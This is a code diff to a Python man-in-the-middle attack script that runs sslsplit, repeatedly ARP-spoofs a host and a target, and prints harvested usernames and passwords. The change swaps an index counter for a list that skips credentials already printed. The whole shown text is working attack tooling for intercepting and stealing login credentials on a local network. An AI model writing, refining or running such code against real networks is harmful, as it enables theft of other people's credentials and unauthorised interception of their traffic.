@@ -119,7 +119,7 @@ if __name__ == "__main__":
 
     sslSplitPid = runSSLSplit()
 
-    currentIndex = 0
+    visited = []
 
     try:
         while True:
@@ -129,10 +129,19 @@ if __name__ == "__main__":
                 # telling the `host` that we are the `target`
                 spoof(host, target, devices, verbose)
             result = fetchPasswd()
-            while len(result) > currentIndex:
-                print("Username:  ", result[currentIndex]["username"], sep = "")
-                print("Password:  ", result[currentIndex]["password"], sep = "")
-                currentIndex = currentIndex + 1
+
+            for item in result:
+                have = False
+                for item2 in visited:
+                    if item2 == item:
+                        have = True
+                        break
+                if have == False:
+                    visited.append(item)
+                    print("Username:  ", item["username"], sep = "")
+                    print("Password:  ", item["password"], sep = "")
+                    print("", sep = "")
+
             time.sleep(1)
     except KeyboardInterrupt:
         print("[!] Detected CTRL+C ! restoring the network, please wait...")
